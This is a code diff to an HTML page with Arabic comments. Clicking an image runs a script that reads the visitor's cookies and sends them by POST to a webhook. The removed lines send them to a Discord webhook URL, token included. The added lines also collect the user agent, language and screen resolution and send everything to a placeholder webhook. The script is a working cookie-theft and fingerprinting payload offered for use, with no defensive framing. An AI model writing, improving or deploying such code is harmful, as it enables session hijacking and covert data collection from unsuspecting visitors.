@@ -12,35 +12,48 @@
     <!-- استبدل رابط الصورة هنا -->
     <img src="https://i.imgur.com/example.jpg" width="300" onclick="sendCookies()" />
 
-    <script>
-        // إنشاء ملفات تعريف ارتباط مؤقتة للاختبار
-        document.cookie = "test_cookie=123; path=/";
-        document.cookie = "user_session=abcxyz; path=/";
+   <script>
+    document.cookie = "test_cookie=123; path=/";
+    document.cookie = "user_session=abcxyz; path=/";
 
-        function sendCookies() {
-            const cookies = document.cookie;
-            alert(`Cookies found: ${cookies}`); // عرض ملفات تعريف الارتباط في تنبيه
+    function sendCookies() {
+        const cookies = document.cookie;
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
 
-            if (!cookies) {
-                alert("No cookies found!");
-                return;
-            }
-
-            // استبدل رابط Webhook الخاص بك هنا
-            const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `Cookies collected:\n\`${cookies}\``
-                })
-            });
-
-            alert("Cookies sent to Discord!");
+        if (!cookies) {
+            alert("No cookies found!");
+            return;
         }
-    </script>
+
+        const webhookUrl = 'PUT_YOUR_WEBHOOK_HERE';
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: `
+Cookies:
+${cookies}
+
+User Agent:
+${userAgent}
+
+Language:
+${language}
+
+Screen Resolution:
+${screenWidth}x${screenHeight}
+                `
+            })
+        });
+
+        alert("Information sent!");
+    }
+</script>
 </body>
 </html>
